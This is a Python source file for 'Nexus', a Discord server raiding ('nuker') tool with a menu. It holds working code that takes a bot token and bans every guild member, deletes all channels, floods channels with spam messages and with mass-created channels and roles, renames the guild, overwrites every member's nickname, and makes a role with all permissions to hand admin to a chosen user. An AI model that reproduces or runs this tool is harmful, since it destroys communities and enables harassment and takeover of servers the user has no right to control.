import os
from colorama import Fore, init
from pystyle import Colors, Colorate
import aiohttp
import asyncio
import requests

exclude = "11"
os.system(f"Title Nexus")
token = None
init(autoreset=True)

def banner():
    bann = """
       ███▄    █ ▓█████ ▒██   ██▒ █    ██   ██████       
       ██ ▀█   █ ▓█   ▀ ▒▒ █ █ ▒░ ██  ▓██▒▒██    ▒       
      ▓██  ▀█ ██▒▒███   ░░  █   ░▓██  ▒██░░ ▓██▄         
      ▓██▒  ▐▌██▒▒▓█  ▄  ░ █ █ ▒ ▓▓█  ░██░  ▒   ██▒      
      ▒██░   ▓██░░▒████▒▒██▒ ▒██▒▒▒█████▓ ▒██████▒▒      
      ░ ▒░   ▒ ▒ ░░ ▒░ ░▒▒ ░ ░▓ ░░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░      
      ░ ░░   ░ ▒░ ░ ░  ░░░   ░▒ ░░░▒░ ░ ░ ░ ░▒  ░ ░      
         ░   ░ ░    ░    ░    ░   ░░░ ░ ░ ░  ░  ░        
               ░    ░  ░ ░    ░     ░           ░        
                                                         \n"""
    print(Colorate.Diagonal(Colors.blue_to_green, bann, 2))

def options():
    opt = """┌────────────────────┬──────────────────────┬────────────────────┐
│ Discord: __crypt__ │  Discord: __crypt__  │ Discord: __crypt__ │
├────────────────────┼──────────────────────┼────────────────────┤
│ [1] Token checker  │ [6] Mass Roles       │ [11] Set Token     │
│ [2] Messager       │ [7] Channel Remover  │ [12] Set Webhook   │
│ [3] Channel Spam   │ [8] Channel Creator  │ [13] Get channels  │
│ [4] Mass Ban       │ [9] Guild Renamer    │ [14] Get invite    │
│ [5] Give Admin     │ [10] Mass nickname   │ [15] Create invite │
└────────────────────┴──────────────────────┴────────────────────┘
│                                                                │
└────────────────────────────────────────────────────────────────┘
\n"""
    return Colorate.Vertical(Colors.blue_to_green, opt, 2)

async def token_checker(token):
    headers = {
        "Authorization": f"Bot {token}"
    }

    url = "https://discord.com/api/v10/users/@me/guilds"
    
    async with aiohttp.ClientSession() as session:
        async with session.get(url, headers=headers) as response:
            if response.status == 200:
                data = await response.json()
                print("Token is valid. User data:")
                print(data)
            else:
                print("Token not found or invalid. Please check your token.")

async def send_message(token, channel_id, message):
    headers = {
        "Authorization": f"Bot {token}"
    }

    url = f"https://discord.com/api/v10/channels/{channel_id}/messages"
    payload = {"content": message}

    async with aiohttp.ClientSession() as session:
        async with session.post(url, headers=headers, json=payload) as response:
            if response.status == 200:
                return "Message sent successfully."
            else:
                return f"Error sending message. Status code: {response.status}"

async def get_guild_channels(token, guild_id):
    headers = {
        "Authorization": f"Bot {token}"
    }

    url = f"https://discord.com/api/v10/guilds/{guild_id}/channels"
    
    async with aiohttp.ClientSession() as session:
        async with session.get(url, headers=headers) as response:
            if response.status == 200:
                data = await response.json()
                return data
            else:
                return f"Error fetching guild channels. Status code: {response.status}"

async def get_guild_invite(token, guild_id):
    headers = {
        "Authorization": f"Bot {token}"
    }

    url = f"https://discord.com/api/v10/guilds/{guild_id}/invites"
    
    async with aiohttp.ClientSession() as session:
        async with session.get(url, headers=headers) as response:
            if response.status == 200:
                data = await response.json()
                return data
            else:
                return f"Error fetching server invite. Status code: {response.status}"

async def channel_spam(token, channel_id, message, num_messages):
    headers = {
        "Authorization": f"Bot {token}"
    }

    url = f"https://discord.com/api/v10/channels/{channel_id}/messages"

    async def send_message_task(message_num):
        payload = {
            "content": message
        }

        base_delay = 0.5  # Initial delay in seconds
        max_delay = 10.0  # Maximum delay in seconds
        current_delay = base_delay

        while True:
            async with aiohttp.ClientSession() as session:
                async with session.post(url, headers=headers, json=payload) as response:
                    if response.status == 200:
                        print(f"Message {message_num}/{num_messages} sent successfully.")
                        break
                    elif response.status == 429:
                        print(f"Rate limited. Waiting for {current_delay} seconds.")
                        await asyncio.sleep(current_delay)
                        # Increase the delay exponentially, but cap it at max_delay
                        current_delay = min(current_delay * 2, max_delay)
                    else:
                        print(f"Message {message_num}/{num_messages}: Error sending message. Status code: {response.status}")
                        break

    tasks = [send_message_task(i + 1) for i in range(num_messages)]
    await asyncio.gather(*tasks)



async def get_guild_members(token, guild_id):
    headers = {
        "Authorization": f"Bot {token}"
    }

    url = f"https://discord.com/api/v10/guilds/{guild_id}/members"
    
    async with aiohttp.ClientSession() as session:
        async with session.get(url, headers=headers) as response:
            if response.status == 200:
                data = await response.json()
                return data
            else:
                return f"Error fetching guild members. Status code: {response.status}"


async def mass_ban(token, guild_id, exclude_users=None):
    headers = {
        "Authorization": f"Bot {token}"  # Prefix the token with "Bot" for a bot token
    }

    url = f"https://discord.com/api/v10/guilds/{guild_id}/members"

    # Fetch the list of members in the guild
    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        members = response.json()
        ban_tasks = []  # List to hold ban coroutines

        for member in members:
            user_id = member.get("user", {}).get("id", "")

            # Check if the user should be excluded from the ban
            if exclude_users and user_id in exclude_users:
                print(f"Skipping user with ID {user_id} from the ban.")
                continue

            # Define a coroutine to ban the user
            async def ban_user(user_id):
                ban_url = f"https://discord.com/api/v10/guilds/{guild_id}/bans/{user_id}"
                ban_response = requests.put(ban_url, headers=headers)

                if ban_response.status_code == 204:
                    print(f"User with ID {user_id} banned successfully.")
                else:
                    print(f"Error banning user with ID {user_id}. Status code: {ban_response.status_code}")

            ban_task = asyncio.create_task(ban_user(user_id))
            ban_tasks.append(ban_task)

        # Await all ban tasks concurrently
        await asyncio.gather(*ban_tasks)
    else:
        print(f"Error fetching guild members. Status code: {response.status_code}")


async def create_admin_role(token, guild_id):
    headers = {
        "Authorization": f"Bot {token}"
    }

    url = f"https://discord.com/api/v10/guilds/{guild_id}/roles"

    payload = {
        "name": "cool Guy",
        "permissions": 2147483647, 
        "color": 0xFF0000  
    }
    
    async with aiohttp.ClientSession() as session:
        async with session.post(url, headers=headers, json=payload) as response:
            if response.status == 201:
                data = await response.json()
                role_id = data.get("id")
                return role_id
            else:
                return None

async def assign_role_to_user(token, guild_id, user_id, role_id):
    headers = {
        "Authorization": f"Bot {token}"
    }

    url = f"https://discord.com/api/v10/guilds/{guild_id}/members/{user_id}/roles/{role_id}"
    
    async with aiohttp.ClientSession() as session:
        async with session.put(url, headers=headers) as response:
            if response.status == 204:
                return "Role assigned to user successfully."
            else:
                return f"Error assigning role to user. Status code: {response.status}"

async def create_mass_roles(token, guild_id, num_roles, role_name):
    headers = {
        "Authorization": f"Bot {token}"
    }

    url = f"https://discord.com/api/v10/guilds/{guild_id}/roles"
    
    async with aiohttp.ClientSession() as session:
        for i in range(num_roles):
            payload = {
                "name": role_name,
                "permissions": 0, 
                "color": 0xFFFFFF  
            }
            
            async with session.post(url, headers=headers, json=payload) as response:
                if response.status != 200:
                    print(f"Failed to create role {i + 1}. Status code: {response.status}")

    print(f"{num_roles} roles created with the name '{role_name}' in the guild with ID {guild_id}.")

async def delete_channel(token, channel_id):
    headers = {
        "Authorization": f"Bot {token}"
    }

    url = f"https://discord.com/api/v10/channels/{channel_id}"
    
    async with aiohttp.ClientSession() as session:
        async with session.delete(url, headers=headers) as response:
            if response.status == 200:
                print(f"Channel with ID {channel_id} has been deleted.")
            else:
                print(f"Error deleting channel with ID {channel_id}. Status code: {response.status}")

async def delete_all_channels(token, guild_id):
    headers = {
        "Authorization": f"Bot {token}"
    }

    url = f"https://discord.com/api/v10/guilds/{guild_id}/channels"
    
    async with aiohttp.ClientSession() as session:
        async with session.get(url, headers=headers) as response:
            if response.status == 200:
                channels = await response.json()
                # Batch the channel IDs for deletion
                channel_ids = [channel.get("id") for channel in channels]
                batch_size = 10  # You can adjust this batch size
                for i in range(0, len(channel_ids), batch_size):
                    batch = channel_ids[i:i + batch_size]
                    tasks = [delete_channel(token, channel_id) for channel_id in batch]
                    await asyncio.gather(*tasks)
                print(f"All channels in the guild with ID {guild_id} have been deleted.")
            else:
                print(f"Error fetching channels. Status code: {response.status}")

async def create_mass_channels(token, guild_id, num_channels, channel_name, channel_type):
    headers = {
        "Authorization": f"Bot {token}"
    }

    url = f"https://discord.com/api/v10/guilds/{guild_id}/channels"

    async def create_channel(channel_num):
        payload = {
            "name": f"{channel_name}-{channel_num}",
            "type": channel_type
        }

        async with aiohttp.ClientSession() as session:
            while True:
                async with session.post(url, headers=headers, json=payload) as response:
                    if response.status == 201:
                        print(f"Channel {channel_num} created successfully.")
                        break
                    elif response.status == 429:
                        await asyncio.sleep(0.79)
                    else:
                        print(f"Failed to create channel {channel_num}. Status code: {response.status}")
                        break

    tasks = [create_channel(i + 1) for i in range(num_channels)]
    await asyncio.gather(*tasks)

    channel_type_str = "text" if channel_type == 0 else "voice"
    print(f"{num_channels} {channel_type_str} channels created with the name '{channel_name}' in the guild with ID {guild_id}.")


async def rename_guild(token, guild_id, new_name):
    headers = {
        "Authorization": f"Bot {token}"
    }

    url = f"https://discord.com/api/v10/guilds/{guild_id}"

    payload = {
        "name": new_name
    }

    async with aiohttp.ClientSession() as session:
        async with session.patch(url, headers=headers, json=payload) as response:
            if response.status == 200:
                return f"Guild renamed to '{new_name}' successfully."
            else:
                return f"Error renaming guild. Status code: {response.status}"


async def mass_name_changer(token, guild_id, new_nickname):
    headers = {
        "Authorization": f"Bot {token}"
    }

    # Fetch the list of members in the guild
    url = f"https://discord.com/api/v10/guilds/{guild_id}/members"

    async with aiohttp.ClientSession() as session:
        async with session.get(url, headers=headers) as response:
            if response.status == 200:
                members = await response.json()
                change_nickname_tasks = []  # List to hold nickname change coroutines

                for member in members:
                    member_id = member['user']['id']
                    url = f"https://discord.com/api/v10/guilds/{guild_id}/members/{member_id}/nick"
                    payload = {"nick": new_nickname}

                    # Define a coroutine to change the nickname
                    async def change_nickname(member_id, url, headers, payload):
                        async with session.patch(url, headers=headers, json=payload) as nick_response:
                            if nick_response.status == 200:
                                print(f"Changed nickname for member with ID {member_id} to '{new_nickname}'.")
                            else:
                                print(f"Error changing nickname for member with ID {member_id}. Status code: {nick_response.status}")

                    change_task = asyncio.create_task(change_nickname(member_id, url, headers, payload))
                    change_nickname_tasks.append(change_task)

                # Await all nickname change tasks concurrently
                await asyncio.gather(*change_nickname_tasks)
            else:
                print(f"Error fetching guild members. Status code: {response.status}")

def create_invite(token, channel_id, max_uses=0, max_age=0):
    headers = {
        "Authorization": f"Bot {token}"
    }

    url = f"https://discord.com/api/v10/channels/{channel_id}/invites"

    payload = {
        "max_age": max_age, 
        "max_uses": max_uses,  
        "unique": True  
    }

    response = requests.post(url, headers=headers, json=payload)

    if response.status_code == 201:
        invite_data = response.json()
        return invite_data.get("url")
    else:
        return None

async def main():
    global token, exclude
    tool_name = "Home"
    show_table = True
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        banner()
        if show_table:
            print(options())
        choice = input(f"nexus/{tool_name}> ").strip().lower()
        if choice == "q":
            print("Goodbye!")
            break
        elif show_table and choice.isdigit():
            choice = int(choice)
            if 1 <= choice <= 15:
                if choice == 1:
                    tool_name = "Token Checker"
                    inp = input("Enter the bot token: ")
                    await token_checker(inp)
                    input("Press enter to continue...")
                    tool_name = "Home"
                elif choice == 2:
                    tool_name = "Messager"
                    use_existing_token = input("Do you want to use the existing token? (1 for Yes, 0 for No): ").strip()
                    if use_existing_token == "1":
                        if token is None:
                            token = input("Enter your token: ")
                        else:
                            inp = token
                    else:
                        inp = input("Enter your Discord bot token: ")

                    channel_id = input("Enter the channel ID where you want to send the message: ")
                    message = input("Enter the message to be sent: ")
                    response = await send_message(inp, channel_id, message)
                    print(response)
                    input("Press Enter to continue...")
                    tool_name = "Home"
                elif choice == 3:
                    tool_name = "Channel Spam"
                    use_existing_token = input("Do you want to use the existing token? (1 for Yes, 0 for No): ").strip()
                    if use_existing_token == "1":
                        if token is None:
                            token = input("Enter your token: ")
                        else:
                            inp = token
                    else:
                        inp = input("Enter your Discord bot token: ")

                    channel_id = input("Enter the channel ID where you want to send messages: ")
                    message = input("Enter the message to be sent: ")
                    num_messages = int(input("Enter the number of messages to send: "))
                    delay = float(input("Enter the delay (in seconds) between messages: "))

                    tasks = []
                    for _ in range(num_messages):
                        tasks.append(send_message(inp, channel_id, message))
                    responses = await asyncio.gather(*tasks)
                    
                    for i, response in enumerate(responses):
                        print(f"Message {i+1}/{num_messages}: {response}")

                    input("Press Enter to continue...")
                    tool_name = "Home"
                elif choice == 4:
                    tool_name = "Mass Ban"
                    use_existing_token = input("Do you want to use the existing token? (1 for Yes, 0 for No): ").strip()
                    if use_existing_token == "1":
                        if token is None:
                            token = input("Enter your token: ")
                        else:
                            inp = token
                    else:
                        inp = input("Enter your Discord bot token: ")

                    guild_id = input("Enter the guild ID where you want to mass ban members: ")

                    exclude = input("Do you want to exclude any user ids? (1 : yes and 0: no) ")
                    if int(exclude) == 1:
                        exclude_users = input("Enter user IDs to exclude from the ban (separate with commas. 0 for none): ").split(",")
                        exclude_users = [user_id.strip() for user_id in exclude_users if user_id.strip()]
                    else:
                        exclude_users = None

                    await mass_ban(inp, guild_id, exclude_users)

                    input("Press Enter to continue...")
                    tool_name = "Home"
                elif choice == 5:
                    tool_name = "Give Admin"
                    use_existing_token = input("Do you want to use the existing token? (1 for Yes, 0 for No): ").strip()
                    if use_existing_token == "1":
                        if token is None:
                            token = input("Enter your token: ")
                        else:
                            inp = token
                    else:
                        inp = input("Enter your Discord bot token: ")

                    guild_id = input("Enter the guild ID: ")
                    user_id = input("Enter the user ID: ")

                    role_id = await create_admin_role(inp, guild_id)

                    if role_id:
                        response = await assign_role_to_user(inp, guild_id, user_id, role_id)
                        print(f"Admin role created and assigned to user with ID {user_id} in the guild with ID {guild_id}.")
                    else:
                        print("Failed to create the admin role.")

                    input("Press Enter to continue...")
                    tool_name = "Home"
                elif choice == 6:
                    tool_name = "Mass Roles"
                    use_existing_token = input("Do you want to use the existing token? (1 for Yes, 0 for No): ").strip()
                    if use_existing_token == "1":
                        if token is None:
                            token = input("Enter your token: ")
                        else:
                            inp = token
                    else:
                        inp = input("Enter your Discord bot token: ")

                    guild_id = input("Enter the guild ID where you want to create roles: ")
                    num_roles = int(input("Enter the number of roles to create: "))
                    role_name = input("Enter the role name: ")

                    await create_mass_roles(inp, guild_id, num_roles, role_name)

                    input("Press Enter to continue...")
                    tool_name = "Home"
                elif choice == 7:
                    tool_name = "Channel Remover"
                    use_existing_token = input("Do you want to use the existing token? (1 for Yes, 0 for No): ").strip()
                    if use_existing_token == "1":
                        if token is None:
                            token = input("Enter your token: ")
                        else:
                            inp = token
                    else:
                        inp = input("Enter your Discord bot token: ")

                    guild_id = input("Enter the guild ID where you want to delete all channels: ")

                    await delete_all_channels(inp, guild_id)

                    input("Press Enter to continue...")
                    tool_name = "Home"
                elif choice == 8:
                    tool_name = "Channel Creator"
                    use_existing_token = input("Do you want to use the existing token? (1 for Yes, 0 for No): ").strip()
                    if use_existing_token == "1":
                        if token is None:
                            token = input("Enter your token: ")
                        else:
                            inp = token
                    else:
                        inp = input("Enter your Discord bot token: ")

                    guild_id = input("Enter the guild ID where you want to create channels: ")
                    num_channels = int(input("Enter the number of channels to create: "))
                    channel_name = input("Enter the channel name: ")
                    channel_type = int(input("Enter the channel type (0 for text, 2 for voice): "))

                    await create_mass_channels(inp, guild_id, num_channels, channel_name, channel_type)

                    input("Press Enter to continue...")
                    tool_name = "Home"
                elif choice == 9:
                    tool_name = "Guild Renamer"
                    use_existing_token = input("Do you want to use the existing token? (1 for Yes, 0 for No): ").strip()
                    if use_existing_token == "1":
                        if token is None:
                            token = input("Enter your token: ")
                        else:
                            inp = token
                    else:
                        inp = input("Enter your Discord bot token: ")

                    guild_id = input("Enter the guild ID where you want to rename the guild: ")
                    new_name = input("Enter the new name for the guild: ")

                    response = await rename_guild(inp, guild_id, new_name)
                    print(response)

                    input("Press Enter to continue...")
                    tool_name = "Home"
                elif choice == 10:
                    tool_name = "Mass Name Changer"
                    use_existing_token = input("Do you want to use the existing token? (1 for Yes, 0 for No): ").strip()
                    if use_existing_token == "1":
                        if token is None:
                            token = input("Enter your token: ")
                        else:
                            inp = token
                    else:
                        inp = input("Enter your Discord bot token: ")

                    guild_id = input("Enter the guild ID: ")
                    new_nickname = input("Enter the new nickname for all members: ")

                    await mass_name_changer(inp, guild_id, new_nickname)

                    input("Press Enter to continue...")
                    tool_name = "Home"
                elif choice == 11:
                    token = input("Enter your Discord bot token: ")
                    print(f"Token set to: {token}")
                    tool_name = "Set Token"
                    input("Press enter to continue...")
                    tool_name = "Home"
                elif choice == 12:
                    tool_name = "Set Webhook"
                elif choice == 13:
                    use_existing_token = input("Do you want to use the existing token? (1 for Yes, 0 for No): ").strip()
                    if use_existing_token == "1":
                        if token is None:
                            token = input("Enter your token: ")
                        else:
                            inp = token
                    else:
                        inp = input("Enter your Discord bot token: ")

                    guild_id = input("Enter the guild ID to check channels: ")
                    guild_channels = await get_guild_channels(inp, guild_id)
                    if isinstance(guild_channels, list):
                        print("Guild channels:")
                        for channel in guild_channels:
                            print(f"- {channel['name']} (ID: {channel['id']})")
                    else:
                        print(guild_channels)
                    tool_name = "Get Channels"
                    input("Press Enter to continue...")
                    tool_name = "Home"
                elif choice == 14:
                    tool_name = "Get Invites"
                    use_existing_token = input("Do you want to use the existing token? (1 for Yes, 0 for No): ").strip()
                    if use_existing_token == "1":
                        if token is None:
                            print("No existing token found. Please enter a new token.")
                        else:
                            inp = token
                    else:
                        inp = input("Enter your Discord bot token: ")

                    guild_id = input("Enter the guild ID to get the invite link: ")
                    invite_info = await get_guild_invite(inp, guild_id)
                    if isinstance(invite_info, dict):
                        print("Server Invite Link:")
                        print(invite_info.get("url"))
                    else:
                        print(invite_info)
                    input("Press Enter to continue...")
                    tool_name = "Home"
                elif choice == 15:
                    tool_name = "Create Invite"
                    use_existing_token = input("Do you want to use the existing token? (1 for Yes, 0 for No): ").strip()
                    if use_existing_token == "1":
                        if token is None:
                            print("No existing token found. Please enter a new token.")
                        else:
                            inp = token
                    else:
                        inp = input("Enter your Discord bot token: ")

                    channel_id = input("Enter the channel ID: ")
                    invite_url = create_invite(token, channel_id, max_uses=1, max_age=86400)  # Create an invite that expires in 24 hours after 1 use
                    if invite_url:
                        print(f"Invite URL: {invite_url}")
                    else:
                        print("Error creating invite.")
                    input("Press Enter to continue...")
                    tool_name = "Home"
                else:
                    print(Fore.RED + "Invalid option. Please select a valid option (1-15)." + Fore.RESET)
            else:
                print(Fore.RED + "Invalid option. Please select a valid option (1-15)." + Fore.RESET)
        elif not show_table and choice == "back":
            show_table = True
            tool_name = "home"
        else:
            print(Fore.RED + "Invalid input. Please enter a valid option or 'Q' to quit or 'back' to return to the home screen." + Fore.RESET)

        if show_table:
            print("Type 'back' to go to home")

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())